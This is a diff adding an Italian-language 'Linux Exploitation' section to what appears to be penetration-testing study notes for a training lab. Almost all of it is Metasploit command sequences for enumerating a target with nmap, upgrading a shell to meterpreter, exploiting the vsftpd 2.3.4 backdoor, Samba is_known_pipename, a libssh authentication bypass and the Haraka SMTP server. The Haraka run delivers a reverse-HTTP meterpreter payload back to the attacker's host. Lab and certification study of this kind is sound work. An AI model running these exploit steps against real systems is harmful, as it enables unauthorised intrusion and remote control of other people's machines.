@@ -1054,3 +1054,83 @@ run post/windows/manage/migrate # Migrazione automatica per stabilità
 
 ## Linux Exploitation
 
+### Creazione workspace MSF ed enumeration del target
+
+```
+service postgresql start
+msfconsole
+workspace -a nomeworkspace
+setg RHOSTS 192.86.51.3
+db_nmap -sS -sV -O 192.209.183.3
+```
+
+### Upgrade da command shell a meterpreter
+
+```
+CTRL+Z //per mettere in background la sessione command shell aperta precedentemente
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+show options
+set LHOST eth1
+set SESSION 1
+run
+sessions
+sessions 2
+sysinfo
+getuid
+```
+
+### Exploiting A Vulnerable FTP Server
+
+```
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+info
+run
+ls
+/bin/bash -i
+```
+
+### Exploiting Samba
+
+<pre><code>search type:exploit name:samba
+<strong>use exploit/linux/samba/is_known_pipename
+</strong>show options
+check //controlliamo se il target è vulnerabile e se c'è una share writable
+info //per controllare che l'exploit sia compatible con la versione di samba del target
+run
+ls
+pwd
+</code></pre>
+
+### Exploiting a Vulnerable SSH Server
+
+```
+search libssh_auth_bypass
+use auxiliary/scanner/ssh/libssh_auth_bypass
+show options
+set SPAWN_PTY true
+run
+sessions
+sessions 1
+whoami
+cat /etc/*release //per capire la versione di linux
+uname -r  //per verificare versione del kernel
+```
+
+### Exploiting A Vulnerable SMTP Server (Haraka)
+
+```
+search type:exploit name:haraka
+use exploit/linux/smtp/haraka
+show options
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http //è un unstaged payload
+set LHOST eth1
+run
+sysinfo
+getuid
+```
+
